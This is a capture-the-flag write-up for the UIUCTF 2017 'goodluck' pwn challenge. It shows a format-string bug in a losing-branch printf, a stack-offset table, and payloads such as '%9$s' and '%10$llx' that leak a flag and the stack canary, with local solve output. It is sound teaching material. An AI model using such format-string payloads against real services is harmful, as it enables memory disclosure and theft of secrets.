# goodluck

| | |
|---|---|
| Event | UIUCTF 2017 |
| Category | pwn |
| Points | 200 |
| Status | solved |

> nc challenge.uiuc.tf 11342

Files: [`goodluck`](handout/goodluck)

The handout's sha256 is `66daf236ffea0308652cb08ae3c59ca52f2c55bb775c0200e1d8614992ad4e26`, and [ctf-wiki/ctf-challenges](https://github.com/ctf-wiki/ctf-challenges) archives the same copy. The service is gone, so everything below ran against the handout locally in 2026. The full disassembly and run log are in [`artifacts/stack-map.txt`](artifacts/stack-map.txt).

<details>
<summary><b>Solution</b></summary>

The losing branch echoes your answer with `printf(user)`. The disassembly shows `main` reading the flag into `rbp-0x20` and storing a pointer to it at `rbp-0x28`, so `%9$s` prints the flag. You have to lose to win.

## Recon

```
$ file handout/goodluck
ELF 64-bit LSB executable, x86-64, dynamically linked, for GNU/Linux 2.6.32, not stripped
$ strings -a handout/goodluck | sed -n '/flag.txt/,/right/p'
flag.txt
what's the flag
You answered:
But that was totally wrong lol get rekt
That's right, the flag is %s
$ objdump -d -M intel handout/goodluck | sed -n '/<main>:/,/^$/p'
```

Only the winning message has a conversion specifier. The disassembly of `main` (the whole program) also shows a `%ms` at `0x4009a3`, too short for `strings` to catch. With `%ms`, `scanf` puts your answer on the heap, and the flag read stops at 22 bytes, so don't bother hunting for an overflow.

```
fopen("flag.txt", "r")                      -> rbp-0x30
22 x _IO_getc into rbp-0x20                 the flag, exactly 22 bytes
fclose
lea rax,[rbp-0x20]; mov [rbp-0x28],rax      char *p = buf
puts("what's the flag")
scanf("%ms", &user)                         -> rbp-0x38, heap allocated
compare user against buf, byte by byte, up to 22
  on any mismatch:  puts("You answered:"); printf(user); puts("...get rekt")
  on a full match:  printf("That's right, the flag is %s\n", p)
```

## The format string

The `printf` call at `0x40088b` uses your answer as its format string, so each conversion specifier you send reads the next varargs slot. `main` opens with `sub rsp,0x40`, so `rsp` is `rbp-0x40` at the call. Under SysV the first five conversion arguments come from `rsi`, `rdx`, `rcx`, `r8`, and `r9`, so `%6$` should be the first stack qword.

| | | | |
|---|---|---|---|
| `%6$` | `[rsp+0x00]` | `rbp-0x40` | padding |
| `%7$` | `[rsp+0x08]` | `rbp-0x38` | `char *user` |
| `%8$` | `[rsp+0x10]` | `rbp-0x30` | `FILE *fp` |
| `%9$` | `[rsp+0x18]` | `rbp-0x28` | `char *p`, pointing at the flag |
| `%10$` | `[rsp+0x20]` | `rbp-0x20` | flag bytes 0 to 7 |
| `%11$` | `[rsp+0x28]` | `rbp-0x18` | flag bytes 8 to 15 |
| `%12$` | `[rsp+0x30]` | `rbp-0x10` | flag bytes 16 to 21 |
| `%13$` | `[rsp+0x38]` | `rbp-0x08` | stack canary |

## Reproduce

Reading the buffer inline doesn't depend on the pointer, so I use it as the cross-check. Harekaze's [writeup](https://st98.github.io/diary/posts/2017-05-01-uiuctf-2017.html) pulled `%10$llx` through `%12$llx` off the live service. They got `776c617b67616c66`, `657669675f737961`, and `7d253031315f`, which are `flag{alw`, `ays_give`, and `_110%}` little endian. `%13$llx` ends in a zero byte, so it's the canary.

A local `flag.txt` holding the real 22 bytes reproduces both reads.

```
$ python3 solve/solve.py
--- %9$s ---
what's the flag
You answered:
flag{always_give_110%}
--- inline qwords ---
776c617b67616c66.657669675f737961.7d253031315f.775546c10026a100
reassembled 'flag{always_give_110%}'
arg 13 is 775546c10026a100, low byte 0x00
```

Flag: `flag{always_give_110%}`
</details>
